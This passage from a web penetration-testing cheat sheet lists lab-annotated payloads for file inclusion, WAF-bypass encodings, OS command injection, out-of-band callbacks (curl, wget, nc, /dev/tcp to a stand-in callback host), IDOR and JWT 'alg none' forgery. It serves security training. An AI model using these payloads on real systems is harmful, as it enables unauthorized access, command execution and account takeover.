ftp://callback.lab.test/marker.txt                        # Loopback FTP marker inclusion served by local recorder
http://callback.lab.test/source.lab.txt                   # Inert source-read fixture from local recorder
http://callback.lab.test/marker                           # Marker inclusion omitting extension
http://callback.lab.test/marker.txt?                      # Query parameter append bypass with inert marker
http://callback.lab.test/marker.txt#                      # URL fragment append bypass with inert marker
http://callback.lab.test/                                 # Loopback recorder root marker
http:/callback.lab.test/marker.txt                        # Single-slash parser case for simple filters
http://callback.lab.test/marker.txt?view=marker           # RFI parameter case using inert marker text
```
*   **Automatic Tool**:
    *   *Notes*: Use wfuzz to scan RFI with a `.lab.test` callback URL list that points to the loopback/local recorder.
    *   *English rewrite*: Use wfuzz to scan RFI using a list URL callback `.lab.test` pointing to the loopback/local recorder.<!-- payload-id: CHEAT-05-008 -->
<!-- context: PHP 8.2 and Apache 2.4 disposable file-include fixture rooted at /tmp/sechub-lab; one URL decode occurs before the include sink; case: 5.4. Remote File Inclusion (RFI) -->
<!-- prerequisites: mount only synthetic include/log files, disable host mounts and public egress, reset the PHP/Apache container after every include attempt -->
<!-- encoding: UTF-8 Bash source with POSIX shell quoting preserved; .lab.test names resolve to loopback and the named tool constructs HTTP/DNS framing -->
<!-- expected-result: the vulnerable fixture fetches only callback.lab.test resolved to the loopback/local recorder and emits its marker; the fixed PHP configuration/allowlist refuses remote schemes; tool output must match the paired application/browser/process log -->
<!-- risk: non-destructive -->
<!-- runnable: false -->
<!-- validation: static-verified -->
<!-- sources: S1 -->
<!-- last-verified: 2026-07-17 -->
    ```bash
    wfuzz -c -z file,/tmp/sechub-lab/rfi-loopback-recorders.txt 'http://victim.lab.test/index.php?file=FUZZ'
    ```


---

### 5.5. WAF Bypass (WAF Bypass Payload included)
*   **Identification / Signs**:
    *   *Notes*: When inserting basic LFI payloads, the system returns `403 Forbidden` or `400 Bad Request` errors due to being blocked by the firewall (WAF).
    *   *English rewrite*: Common traversal sequences are blocked by web application firewalls, returning `403` or `400` status codes.
*   **Suspicion / Testing**:
    *   *Notes*: Test variants with encoding (Double URL encode, Overlong UTF-8) or nested strings (`....//`) to bypass filters.
    *   *English rewrite*: Test double URL encoding, overlong UTF-8, or nested path sequences to bypass input sanitizers.
*   **Payloads (10 Payloads)**:<!-- payload-id: CHEAT-05-009 -->
<!-- context: PHP 8.2 and Apache 2.4 disposable file-include fixture rooted at /tmp/sechub-lab; one URL decode occurs before the include sink; case: 5.5. WAF Bypass (WAF Bypass Payload included) -->
<!-- prerequisites: mount only synthetic include/log files, disable host mounts and public egress, reset the PHP/Apache container after every include attempt -->
<!-- encoding: UTF-8 line-oriented payload list; each non-comment line is an independent case and is encoded only by the documented URL/header/parser layer -->
<!-- expected-result: exactly one decode/normalization path reaches the synthetic file marker in the vulnerable fixture; canonical containment blocks every encoded variant -->
<!-- risk: non-destructive -->
<!-- runnable: false -->
<!-- validation: static-verified -->
<!-- sources: S1 -->
<!-- last-verified: 2026-07-17 -->
```
..%252f..%252f..%252ftmp%252fsechub-lab%252ffixture.txt # Double URL encoded traversal to synthetic marker
..%c0%af..%c0%aftmp%c0%afsechub-lab%c0%affixture.txt # Overlong UTF-8 slash encoding toward synthetic marker
....//....//....//tmp/sechub-lab/fixture.txt         # Nested traversal to synthetic fixture
..%2f..%2f..%2ftmp%2fsechub-lab%2ffixture.txt        # Basic URL encoded traversal to synthetic marker
..%5c..%5c..%5csechub-lab%5cwin.ini.fixture          # Windows backslash URL encoded traversal to synthetic marker
../../../../tmp/sechub-lab/fixture.txt%00            # Legacy-only null-byte case
../../../../tmp/sechub-lab/fixture.txt/./././        # Synthetic marker boundary case
?file=index.php&file=../../../../tmp/sechub-lab/fixture.txt # Duplicate-parameter parser case
/tmp/sechub-lab/fixture.txt/                         # Trailing slash synthetic marker case
php://filter/convert.base64-encode/resource=/tmp/sechub-lab/fixture.txt # Synthetic wrapper source-read case
```
*   **Automatic tool**:
    *   *Notes*: Fuzzing with Burp Suite using a fixture-only bypass list that only points to synthetic markers.
    *   *English rewrite*: Fuzz parameters with Burp Suite using fixture-only LFI bypass wordlists that target synthetic markers.<!-- payload-id: CHEAT-05-010 -->
<!-- context: PHP 8.2 and Apache 2.4 disposable file-include fixture rooted at /tmp/sechub-lab; one URL decode occurs before the include sink; case: 5.5. WAF Bypass (WAF Bypass Payload included) -->
<!-- prerequisites: mount only synthetic include/log files, disable host mounts and public egress, reset the PHP/Apache container after every include attempt -->
<!-- encoding: UTF-8 Bash source with POSIX shell quoting preserved; .lab.test names resolve to loopback and the named tool constructs HTTP/DNS framing -->
<!-- expected-result: exactly one decode/normalization path reaches the synthetic file marker in the vulnerable fixture; canonical containment blocks every encoded variant; tool output must match the paired application/browser/process log -->
<!-- risk: non-destructive -->
<!-- runnable: false -->
<!-- validation: static-verified -->
<!-- sources: S1 -->
<!-- last-verified: 2026-07-17 -->
    ```bash
    # Fuzz for LFI bypasses using ffuf with double encoding and filter bypass payloads
    ffuf -u "http://victim.lab.test/index.php?file=FUZZ" -w /tmp/sechub-lab/lfi-bypass-fixture-paths.txt -fs <normal_response_size>
    # Curl command reading only the synthetic marker via double URL encoded path
    curl -s "http://victim.lab.test/index.php?file=..%252f..%252f..%252ftmp%252fsechub-lab%252ffixture.txt"
    ```

---

## References

- **[S1]** OWASP WSTG — Testing for File Inclusion. https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/07-Input_Validation_Testing/11.1-Testing_for_File_Inclusion — current version; accessed: 2026-07-18.

---

## 6. Command Injection (OS Injection)

> [!CAUTION]
> Only use in a local lab or clearly authorized system. Payloads with risk `destructive`, `dos`, or `oob` must be run in an isolated fixture, with resource limits and no outbound network.

> **Scope of use:** The payloads are lab examples according to the context/version noted in the annotation. Only use in local authorized fixtures; do not consider a syntactically correct payload as proof of exploitation on any system.

Command Injection occurs when user input is directly concatenated into the server's operating system command execution functions without being sanitized, allowing arbitrary code execution.

> **Related Lesson:** [Command Execution](05-injection/command-execution/), [Code Injection](05-injection/code-injection/), [Remote Code Execution](10-exceptional-conditions/remote-code-execution/).

### 6.1. Active Command Injection (Direct Output)
*   **Identification / Signs**:
    *   *Notes*: Appears when the application executes an operating system command and directly displays the entire stdout/stderr result on the web page interface.
    *   *English rewrite*: Command execution stdout/stderr is returned directly in the application web response.
*   **Suspicion / Testing**:
    *   *Notes*: Enter command concatenation characters like `;`, `|`, `&`, `&&`, `||` followed by test commands (`id`, `whoami`).
    *   *English rewrite*: Test parameter values with metacharacters like `;`, `|`, `&`, `&&`, `||` followed by probe commands.
*   **Payloads (10 Payloads)**:<!-- payload-id: CHEAT-06-001 -->
<!-- context: Bash 5.2 invoked by a PHP 8.2 command-wrapper fixture in an Ubuntu 22.04 disposable container; user input occupies one shell argument; case: 6.1. Active Command Injection (Direct Output) -->
<!-- prerequisites: use a non-root container with a synthetic working directory, local callback recorder and command timeout; run one probe at a time and discard filesystem changes -->
<!-- encoding: UTF-8 line-oriented payload list; each non-comment line is an independent case and is encoded only by the documented URL/header/parser layer -->
<!-- expected-result: the vulnerable wrapper prints the harmless command identity/marker; the argument-vector implementation treats separators as literal data -->
<!-- risk: non-destructive -->
<!-- runnable: false -->
<!-- validation: static-verified -->
<!-- sources: S1,S2 -->
<!-- last-verified: 2026-07-17 -->
```
; id                                                 # Terminates command and executes id (Linux)
& id                                                 # Backgrounds execution and runs id (Linux/Windows)
&& id                                                # Runs id if the first command succeeds (Linux/Windows)
| id                                                 # Pipes input to id (Linux/Windows)
|| id                                                # Runs id if the first command fails (Linux/Windows)
%0aid                                                # Hex encoded newline separator execution (Linux)
`id`                                                 # Inlined backtick command evaluation (Linux)
$(id)                                                # Inline subshell command execution (Linux)
& whoami                                             # CMD command concatenation (Windows)
; printf$IFS'SECHUB_CMD_PROBE'                          # Harmless marker using IFS as a space substitute
```
*   **Automatic Tool**:
    *   *Notes*: Use Commix to automatically scan, detect, and exploit Active Command Injection.
    *   *English rewrite*: Use Commix to automatically scan, detect, and exploit Active Command Injection.<!-- payload-id: CHEAT-06-002 -->
<!-- context: Bash 5.2 invoked by a PHP 8.2 command-wrapper fixture in an Ubuntu 22.04 disposable container; user input occupies one shell argument; case: 6.1. Active Command Injection (Direct Output) -->
<!-- prerequisites: use a non-root container with a synthetic working directory, local callback recorder and command timeout; run one probe at a time and discard filesystem changes -->
<!-- encoding: UTF-8 Bash source with POSIX shell quoting preserved; .lab.test names resolve to loopback and the named tool constructs HTTP/DNS framing -->
<!-- expected-result: the vulnerable wrapper prints the harmless command identity/marker; the argument-vector implementation treats separators as literal data; tool output must match the paired application/browser/process log -->
<!-- risk: non-destructive -->
<!-- runnable: false -->
<!-- validation: static-verified -->
<!-- sources: S1,S2 -->
<!-- last-verified: 2026-07-17 -->
    ```bash
    commix --url="http://victim.lab.test/cmd.php?addr=127.0.0.1" --batch
    ```


---

### 6.2. Blind Time-based Command Injection
*   **Detection / Signs**:
    *   *Notes*: The application executes operating system commands but the stdout results are not displayed on the screen or the response is HTTP.
    *   *English rewrite*: Command is executed but output is hidden. Detection must be performed via processing time delays.
*   **Suspicion / Testing**:
    *   *Notes*: Insert commands that cause system delays like `sleep 5` or `timeout 5` and check if the server response time increases.
    *   *English rewrite*: Inject time delay commands (`sleep 5`) and measure server latency.
*   **Payloads (10 Payloads)**:<!-- payload-id: CHEAT-06-003 -->
<!-- context: Bash 5.2 invoked by a PHP 8.2 command-wrapper fixture in an Ubuntu 22.04 disposable container; user input occupies one shell argument; case: 6.2. Blind Time-based Command Injection -->
<!-- prerequisites: use a non-root container with a synthetic working directory, local callback recorder and command timeout; run one probe at a time and discard filesystem changes -->
<!-- encoding: UTF-8 line-oriented payload list; each non-comment line is an independent case and is encoded only by the documented URL/header/parser layer -->
<!-- expected-result: one request adds the bounded five-second delay in the vulnerable shell wrapper; the fixed argument-vector call remains at baseline latency -->
<!-- risk: non-destructive -->
<!-- runnable: false -->
<!-- validation: static-verified -->
<!-- sources: S1,S2 -->
<!-- last-verified: 2026-07-17 -->
```
; sleep 5                                            # Suspends execution for 5 seconds (Linux)
&& sleep 5                                           # Delay if preceding command succeeds (Linux)
|| sleep 5                                           # Delay if preceding command fails (Linux)
$(sleep 5)                                           # Inline time-based delay (Linux)
& sleep 5 &                                          # Background delay call (Linux)
& timeout 5                                          # Suspends execution using Windows timeout (Windows)
& ping -n 6 127.0.0.1                                # Windows fallback delay using ping loop (Windows)
; Start-Sleep -s 5                                   # PowerShell sleep delay (Windows)
; test -f /tmp/sechub-lab/marker && sleep 5           # Bounded fixture-only conditional delay
;sleep$IFS''5                                        #  Time delay utilizing space substitute to bypass space filters and WAF rules.
```
*   **Automatic Tool**:
    *   *Notes*: Configure Commix to run in Blind Time-based mode.
    *   *English rewrite*: Run Commix in Blind Time-based mode.<!-- payload-id: CHEAT-06-004 -->
<!-- context: Bash 5.2 invoked by a PHP 8.2 command-wrapper fixture in an Ubuntu 22.04 disposable container; user input occupies one shell argument; case: 6.2. Blind Time-based Command Injection -->
<!-- prerequisites: use a non-root container with a synthetic working directory, local callback recorder and command timeout; run one probe at a time and discard filesystem changes -->
<!-- encoding: UTF-8 Bash source with POSIX shell quoting preserved; .lab.test names resolve to loopback and the named tool constructs HTTP/DNS framing -->
<!-- expected-result: one request adds the bounded five-second delay in the vulnerable shell wrapper; the fixed argument-vector call remains at baseline latency; tool output must match the paired application/browser/process log -->
<!-- risk: non-destructive -->
<!-- runnable: false -->
<!-- validation: static-verified -->
<!-- sources: S1,S2 -->
<!-- last-verified: 2026-07-17 -->
    ```bash
    commix --url="http://victim.lab.test/cmd.php?addr=127.0.0.1" --technique=T --batch
    ```


---

### 6.3. Blind Out-of-Band (OOB) Command Injection
*   **Identification / Signs**:
    *   *Notes*: The application silently executes commands and the target server has outgoing network connections.
    *   *English rewrite*: Command is executed silently, and the target server permits outgoing network connections.
*   **Suspicion / Testing**:
    *   *Notes*: Inject commands calling back to servers DNS/HTTP OOB (like `nslookup`, `curl`) to check if there are network callbacks.
    *   *English rewrite*: Inject command callbacks (`curl`, `nslookup`) pointing to your OOB listener domain.
*   **Payloads (10 Payloads)**:<!-- payload-id: CHEAT-06-005 -->
<!-- context: Bash 5.2 invoked by a PHP 8.2 command-wrapper fixture in an Ubuntu 22.04 disposable container; user input occupies one shell argument; case: 6.3. Blind Out-of-Band (OOB) Command Injection -->
<!-- prerequisites: use a non-root container with a synthetic working directory, local callback recorder and command timeout; run one probe at a time and discard filesystem changes -->
<!-- encoding: UTF-8 line-oriented payload list; each non-comment line is an independent case and is encoded only by the documented URL/header/parser layer -->
<!-- expected-result: the vulnerable wrapper creates one DNS/HTTP event on the loopback callback recorder; the fixed wrapper creates no callback -->
<!-- risk: oob -->
<!-- runnable: false -->
<!-- validation: static-verified -->
<!-- sources: S1,S2 -->
<!-- last-verified: 2026-07-17 -->
```
; curl -fsS http://callback.lab.test/SECHUB                # Loopback HTTP marker
; wget -qO- http://callback.lab.test/SECHUB                 # Alternative loopback HTTP marker
; nslookup SECHUB.callback.lab.test                         # Loopback DNS marker
; dig SECHUB.callback.lab.test                              # Alternative loopback DNS marker
; ping -c 1 callback.lab.test                               # One bounded loopback ICMP probe
; nc -z -w 1 callback.lab.test 18081                        # Bounded TCP connect probe; no shell
; printf SECHUB >/dev/tcp/callback.lab.test/18081           # Fixed marker to local TCP recorder
; Invoke-WebRequest -Method Head http://callback.lab.test/SECHUB # PowerShell loopback HEAD request
& curl.exe -I http://callback.lab.test/SECHUB               # Windows loopback HEAD request
;curl$IFS-fsS$IFS'http://callback.lab.test/SECHUB'           # IFS variant with a fixed marker
```
*   **Automatic Tool**:
    *   *Notes*: Use Commix with `--oob-server` configuration to catch automatic callbacks.
    *   *English rewrite*: Use Commix with `--oob-server` parameter to capture automatic reverse connection signals.<!-- payload-id: CHEAT-06-006 -->
<!-- context: Bash 5.2 invoked by a PHP 8.2 command-wrapper fixture in an Ubuntu 22.04 disposable container; user input occupies one shell argument; case: 6.3. Blind Out-of-Band (OOB) Command Injection -->
<!-- prerequisites: use a non-root container with a synthetic working directory, local callback recorder and command timeout; run one probe at a time and discard filesystem changes -->
<!-- encoding: UTF-8 Bash source with POSIX shell quoting preserved; .lab.test names resolve to loopback and the named tool constructs HTTP/DNS framing -->
<!-- expected-result: the vulnerable wrapper creates one DNS/HTTP event on the loopback callback recorder; the fixed wrapper creates no callback; tool output must match the paired application/browser/process log -->
<!-- risk: non-destructive -->
<!-- runnable: false -->
<!-- validation: static-verified -->
<!-- sources: S1,S2 -->
<!-- last-verified: 2026-07-17 -->
    ```bash
    commix --url="http://victim.lab.test/cmd.php?addr=127.0.0.1" --dns-domain="callback.lab.test"
    ```


---

### 6.4. Filter Bypass & WAF Bypass (WAF Bypass Payload included)
*   **Identification / Signs**:
    *   *Notes*: Basic command concatenation characters (such as spaces, semicolons) or keywords are blocked by the firewall and trigger a 403 error.
    *   *English rewrite*: Traversal elements (spaces, semicolons) or command signatures are blocked by filtering rules.
*   **Suspicion / Testing**:
    *   *Notes*: Try using environment variable `$IFS`, curly braces `{}`, or Base64 encoding to bypass the filter.
    *   *English rewrite*: Test path separators alternative structures, brace expansion, or Base64 decoding string pipelines.
*   **Payloads (10 Payloads)**:<!-- payload-id: CHEAT-06-007 -->
<!-- context: Bash 5.2 invoked by a PHP 8.2 command-wrapper fixture in an Ubuntu 22.04 disposable container; user input occupies one shell argument; case: 6.4. Filter Bypass & WAF Bypass (WAF Bypass Payload included) -->
<!-- prerequisites: use a non-root container with a synthetic working directory, local callback recorder and command timeout; run one probe at a time and discard filesystem changes -->
<!-- encoding: UTF-8 line-oriented payload list; each non-comment line is an independent case and is encoded only by the documented URL/header/parser layer -->
<!-- expected-result: exactly one decode/normalization path reaches the synthetic file marker in the vulnerable fixture; canonical containment blocks every encoded variant -->
<!-- risk: non-destructive -->
<!-- runnable: false -->
<!-- validation: static-verified -->
<!-- sources: S1,S2 -->
<!-- last-verified: 2026-07-17 -->
```
;printf$IFS'SECHUB_CMD_PROBE'                        # IFS space substitute
;{printf,SECHUB_CMD_PROBE}                           # Bash brace expansion
;p'r'intf SECHUB_CMD_PROBE                           # Quote-separated keyword
;a=pri;b=ntf;$a$b SECHUB_CMD_PROBE                   # Variable-built command
;echo -e "\x70\x72\x69\x6e\x74\x66\x20\x53\x45\x43\x48\x55\x42" | bash # Encoded harmless marker
;echo "cHJpbnRmIFNFQ0hVQg==" | base64 -d | sh        # Base64 harmless marker
& powershell -Command "Write-Output SECHUB_CMD_PROBE" # Windows marker without file/network access
;printf SECHUB?CMD?PROBE                             # Glob interpretation in synthetic directory only
;${PATH:0:1}usr${PATH:0:1}bin${PATH:0:1}printf SECHUB # Dynamic path separators, harmless output
;$(echo{printf,SECHUB_CMD_PROBE})                    # Combined brace and subshell marker
```
*   **Automatic Tool**:
    *   *Notes*: Use Commix combined with tamper scripts to automate bypassing the filters of WAF.
    *   *English rewrite*: Configure Commix with custom tamper scripts to bypass signature checking.<!-- payload-id: CHEAT-06-008 -->
<!-- context: Bash 5.2 invoked by a PHP 8.2 command-wrapper fixture in an Ubuntu 22.04 disposable container; user input occupies one shell argument; case: 6.4. Filter Bypass & WAF Bypass (WAF Bypass Payload included) -->
<!-- prerequisites: use a non-root container with a synthetic working directory, local callback recorder and command timeout; run one probe at a time and discard filesystem changes -->
<!-- encoding: UTF-8 Bash source with POSIX shell quoting preserved; .lab.test names resolve to loopback and the named tool constructs HTTP/DNS framing -->
<!-- expected-result: exactly one decode/normalization path reaches the synthetic file marker in the vulnerable fixture; canonical containment blocks every encoded variant; tool output must match the paired application/browser/process log -->
<!-- risk: non-destructive -->
<!-- runnable: false -->
<!-- validation: static-verified -->
<!-- sources: S1,S2 -->
<!-- last-verified: 2026-07-17 -->
    ```bash
    commix --url="http://victim.lab.test/cmd.php?addr=127.0.0.1" --tamper="base64encode" --batch
    ```

---

## References

- **[S1]** OWASP OS Command Injection Defense Cheat Sheet. https://cheatsheetseries.owasp.org/cheatsheets/OS_Command_Injection_Defense_Cheat_Sheet.html — current version; accessed: 2026-07-18.
- **[S2]** PortSwigger Web Security Academy — OS command injection. https://portswigger.net/web-security/os-command-injection — current version; accessed: 2026-07-18.

---

## 7. IDOR / Broken Access Control

> [!CAUTION]
> Only use in a local lab or clearly authorized system. Payloads with risk `destructive`, `dos`, or `oob` must be run in an isolated fixture, with resource limits and no outbound network.

> **Scope of use:** The payloads are lab examples according to the context/version noted in the annotation. Only use in local authorized fixtures; do not consider a syntactically correct payload as proof of exploitation on any system.

IDOR (Insecure Direct Object Reference) is an authorization vulnerability that occurs when an application provides direct access to objects through user-controlled parameters without verifying ownership rights.

> **Related Lesson:** [IDOR](01-broken-access-control/idor/), [Broken Access Control](01-broken-access-control/broken-access-control/), [Privilege Escalation](01-broken-access-control/privilege-escalation/), [GraphQL Vulnerabilities](11-api-security/graphql-vulnerabilities/).

### 7.1. Horizontal Privilege Escalation / IDOR
*   **Identification / Signs**:
    *   *Notes*: URL or POST data directly contains ID accounts or ID resources in predictable incrementing numbers.
    *   *English rewrite*: Request parameters or routes display direct object IDs (predictable sequential integers or UUIDs).
*   **Suspicion / Testing**:
    *   *Notes*: Log in with two accounts of the same privilege level. Use account A's token to send requests to access ID of account B.
    *   *English rewrite*: Test using two accounts of equivalent privilege levels; attempt to access/modify resources of the second user.
*   **Payloads (10 Payloads)**:<!-- payload-id: CHEAT-07-001 -->
<!-- context: Node.js 20 and Express 4.19 API fixture at victim.lab.test; synthetic users 1001-1003 and separate regular/admin bearer tokens; case: 7.1. Horizontal Privilege Escalation / IDOR -->
<!-- prerequisites: seed distinct owners and roles, keep the actor token fixed while changing only the documented object/function identifier, and capture policy/datastore logs -->
<!-- encoding: UTF-8 line-oriented payload list; each non-comment line is an independent case and is encoded only by the documented URL/header/parser layer -->
<!-- expected-result: the fixed actor token can read its own synthetic object but receives 403/404 for every other seeded owner; the vulnerable fixture returns the foreign marker -->
<!-- risk: state-changing -->
<!-- runnable: false -->
<!-- validation: static-verified -->
<!-- sources: S1 -->
<!-- last-verified: 2026-07-17 -->
```
GET /api/v1/profile?id=1002                          # Attempts to access user 1002 profile (Original: 1001)
GET /api/v1/profile?id=0                             # ID 0 injection to check default/system accounts
GET /api/v1/profile?id=-1                            # Negative integer bound check
GET /api/v1/profile?id[]=1001&id[]=1002              # Array parameter injection to bypass database query limits
GET /api/v1/profile?id=1001&id=1002                  # HTTP Parameter Pollution (HPP) query manipulation
POST /api/v1/billing {"invoice_id":2045,"user_id":50}# Body parameter manipulation to change invoice owner
<request><order_id>2045</order_id><user_id>50</user_id></request> # XML parameter tampering in SOAP/XML API
GET /api/v1/profile (Header: X-User-ID: 1)           # Identity Header spoofing (Admin ID guess)
PUT /api/v1/profile {"email":"attacker@callback.lab.test"}   # Accesses update router without validating ownership
GET /api/v1/profile?id=6c84ade0-1041-11e9-8b2f-97e0049d5c41 # Guessing UUIDv1 timestamp component (valid 36-character UUIDv1 format)
```
*   **Automatic tool**:
    *   *Notes*: Use Burp Suite Intruder to automatically scan by replacing sequential ID numbers or use the Autorize utility.
    *   *English rewrite*: Use Burp Suite Intruder to iterate over sequential parameter IDs or deploy Autorize.<!-- payload-id: CHEAT-07-002 -->
<!-- context: Node.js 20 and Express 4.19 API fixture at victim.lab.test; synthetic users 1001-1003 and separate regular/admin bearer tokens; case: 7.1. Horizontal Privilege Escalation / IDOR -->
<!-- prerequisites: seed distinct owners and roles, keep the actor token fixed while changing only the documented object/function identifier, and capture policy/datastore logs -->
<!-- encoding: UTF-8 Bash source with POSIX shell quoting preserved; .lab.test names resolve to loopback and the named tool constructs HTTP/DNS framing -->
<!-- expected-result: the fixed actor token can read its own synthetic object but receives 403/404 for every other seeded owner; the vulnerable fixture returns the foreign marker; tool output must match the paired application/browser/process log -->
<!-- risk: non-destructive -->
<!-- runnable: false -->
<!-- validation: static-verified -->
<!-- sources: S1 -->
<!-- last-verified: 2026-07-17 -->
    ```bash
    # Fuzz sequential integer ID parameters to discover IDOR vulnerabilities using ffuf
    ffuf -u "http://victim.lab.test/api/v1/profile?id=FUZZ" -w ids_list.txt -fs <normal_response_size>
    # Fuzz UUID parameters using a custom wordlist to discover horizontal escalation
    ffuf -u "http://victim.lab.test/api/v1/profile?id=FUZZ" -w uuids_list.txt -fs <normal_response_size>
    ```


---

### 7.2. Vertical Privilege Escalation / Broken Access Control
*   **Identification / Signs**:
    *   *Notes*: Administrative endpoints are exposed, or parameters specify roles such as `role=User` or `is_admin=false`.
    *   *English rewrite*: Administrative endpoints are exposed, or parameters explicitly indicate roles (e.g. `role`, `is_admin`).

<!-- payload-id: CHEAT-07-003 -->
<!-- context: Node.js 20 and Express 4.19 API fixture at victim.lab.test; synthetic users 1001-1003 and separate regular/admin bearer tokens; case: 7.2. Vertical Privilege Escalation / Broken Access Control -->
<!-- prerequisites: seed distinct owners and roles, keep the actor token fixed while changing only the documented object/function identifier, and capture policy/datastore logs -->
<!-- encoding: UTF-8 Bash source with POSIX shell quoting preserved; .lab.test names resolve to loopback and the named tool constructs HTTP/DNS framing -->
<!-- expected-result: the regular token is denied every admin function while the admin positive control succeeds; client-side role fields never change server authority -->
<!-- risk: non-destructive -->
<!-- runnable: false -->
<!-- validation: static-verified -->
<!-- sources: S1 -->
<!-- last-verified: 2026-07-17 -->
    ```bash
    # Use curl to check access to administrative endpoint using a low-privilege token
    curl -H "Authorization: Bearer <low_privilege_token>" http://victim.lab.test/api/admin/users
    ```
*   **Suspicion / Check**:
    *   *Notes*: Use a regular account to send requests to the Admin's API/URL and see if the system denies access.
    *   *English rewrite*: Issue requests to administrator endpoints using standard user sessions.
*   **Payloads (10 Payloads)**:<!-- payload-id: CHEAT-07-004 -->
<!-- context: Node.js 20 and Express 4.19 API fixture at victim.lab.test; synthetic users 1001-1003 and separate regular/admin bearer tokens; case: 7.2. Vertical Privilege Escalation / Broken Access Control -->
<!-- prerequisites: seed distinct owners and roles, keep the actor token fixed while changing only the documented object/function identifier, and capture policy/datastore logs -->
<!-- encoding: UTF-8 line-oriented payload list; each non-comment line is an independent case and is encoded only by the documented URL/header/parser layer -->
<!-- expected-result: the regular token is denied every admin function while the admin positive control succeeds; client-side role fields never change server authority -->
<!-- risk: state-changing -->
<!-- runnable: false -->
<!-- validation: static-verified -->
<!-- sources: S1 -->
<!-- last-verified: 2026-07-17 -->
```
GET /admin/dashboard                                 # Direct URL access to admin endpoint
GET /api/admin/users (Bearer regular_user_token)     # Accesses administrative APIs with low privilege session
POST /api/v1/users {"username":"test","is_admin":true} # Mass Assignment parameter injection to escalate role
POST /api/v1/users {"username":"test","role":"Admin"}# Directly modifies privilege parameters in JSON body
GET /api/v1/admin/settings                           # Testing unauthenticated administrative paths
PUT /api/v1/settings {"registration_enabled":true}   # Modifies global settings route without proper verification
GET /api/v1/users/me (Header: X-Original-URL: /api/v1/admin/users) # URL rewrite bypass
GET /admin (Header: X-Custom-IP-Authorization: 127.0.0.1) # Bypasses IP access restriction via local address header
GET /admin (Header: X-Forwarded-For: 127.0.0.1)      # Local IP forwarding spoofing
POST /api/v1/user/upgrade {"user_id":1001}           # Unverified user role elevation endpoint
```
*   **Automatic Tool**:
    *   *Notes*: Configure the Autorize extension on Burp Suite to automatically repeat requests with Admin privileges.
*   *English rewrite*: Set up the Autorize extension in Burp Suite to automatically repeat requests with Admin privileges.

---

## References

- **[S1]** OWASP Authorization Cheat Sheet. https://cheatsheetseries.owasp.org/cheatsheets/Authorization_Cheat_Sheet.html — current version; accessed: 2026-07-18.

---

## 8. JWT Attacks

> [!CAUTION]
> Only use in a local lab or clearly authorized system. Payloads with risk `destructive`, `dos`, or `oob` must be run in an isolated fixture, with resource limits and no outbound network.

> **Scope of use:** The payloads are lab examples according to the context/version noted in the annotation. Only use in local authorized fixtures; do not consider a syntactically correct payload as proof of exploitation on any system.

JWT Attacks occur when an application insecurely configures or validates JSON Web Token (JWT), allowing an attacker to modify the token's contents, forge the signature, or change permissions.

> **Related Lessons:** [JWT Attacks](07-authentication-failures/jwt-attacks/), [Weak Session IDs](07-authentication-failures/weak-session-ids/), [Session Hijacking](07-authentication-failures/session-hijacking/), [OAuth Vulnerabilities](07-authentication-failures/oauth-vulnerabilities/).

### 8.1. Alg None Attacks
*   **Recognition / Signs**:
    *   *Notes*: The JWT token is used to authenticate users via Cookie or Authorization header.
    *   *English rewrite*: JWT token format is present inside HTTP requests, containing metadata parameters in header block.
*   **Suspect / Check**:
    *   *Notes*: Decode the token, change the value of the `"alg"` attribute to `"none"` (or variants), remove the signature and resend.
    *   *English rewrite*: Decode token, change signature algorithm header value to `none`, strip signature block and verify.
*   **Payloads (10 Payloads)**:<!-- payload-id: CHEAT-08-001 -->
<!-- context: PyJWT 2.8 and node-jose 5.x validator fixtures with separate HS256 and RS256 keys; tokens and JWKS are synthetic and local; case: 8.1. Alg None Attacks -->
<!-- prerequisites: use only generated lab keys/tokens, pin the validator allowlist and key lookup behavior for the selected case, and delete all key material after the run -->
<!-- encoding: UTF-8 line-oriented payload list; each non-comment line is an independent case and is encoded only by the documented URL/header/parser layer -->
<!-- expected-result: only the deliberately vulnerable validator accepts an unsigned synthetic token; the fixed validator rejects it because the algorithm allowlist requires a signature -->
<!-- risk: non-destructive -->
<!-- runnable: false -->
<!-- validation: static-verified -->
<!-- sources: S1,S2,S4,S5,S6 -->
<!-- last-verified: 2026-07-17 -->
```
	Header: eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0         # {"alg":"none","typ":"JWT"} as base64url without padding
	Header: eyJhbGciOiJOT05FIiwidHlwIjoiSldUIn0         # {"alg":"NONE","typ":"JWT"} as base64url without padding
	Header: eyJhbGciOiJuT25FIiwidHlwIjoiSldUIn0         # {"alg":"nOnE","typ":"JWT"} as base64url without padding
	Token: eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJzdWIiOiJsYWItdXNlciIsInNjb3BlIjoibGFiLXJlYWQiLCJleHAiOjE4OTM0NTYwMDB9. # Unsigned synthetic token with trailing dot
	Token: eyJhbGciOiJOT05FIiwidHlwIjoiSldUIn0.eyJzdWIiOiJsYWItdXNlciIsInNjb3BlIjoibGFiLXJlYWQiLCJleHAiOjE4OTM0NTYwMDB9. # Case-variant algorithm token
	Token: eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJzdWIiOiJsYWItdXNlciIsInNjb3BlIjoibGFiLXJlYWQiLCJleHAiOjE4OTM0NTYwMDB9 # Trailing dot omitted rejection case
	Header: eyJhbGciOiJub25lIiwiZXh0cmEiOiJ0ZXN0In0     # Extra header parameter as base64url without padding
	Token: eyJhbGciOiJub25lIn0.eyJzdWIiOiJsYWItdXNlciIsInNjb3BlIjoibGFiLXJlYWQiLCJleHAiOjE4OTM0NTYwMDB9. # Minimal none header token
	Token: eyJhbGciOiJuT25FIiwidHlwIjoiSldUIn0.eyJzdWIiOiJsYWItdXNlciIsInNjb3BlIjoibGFiLXJlYWQiLCJleHAiOjE4OTM0NTYwMDB9. # Mixed-case algorithm token
	Token: eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJzdWIiOiJsYWItdXNlciIsInNjb3BlIjoibGFiLXJlYWQiLCJleHAiOjE4OTM0NTYwMDB9. # Long-expiry lab-read token
```
*   **Automatic Tool**:
    *   *Notes*: Use the jwt_tool tool to automatically scan for the "none" algorithm vulnerability on tokens.
    *   *English rewrite*: Use the jwt_tool tool to automatically scan for the "none" algorithm vulnerability on tokens.<!-- payload-id: CHEAT-08-002 -->
<!-- context: PyJWT 2.8 and node-jose 5.x validator fixtures with separate HS256 and RS256 keys; tokens and JWKS are synthetic and local; case: 8.1. Alg None Attacks -->
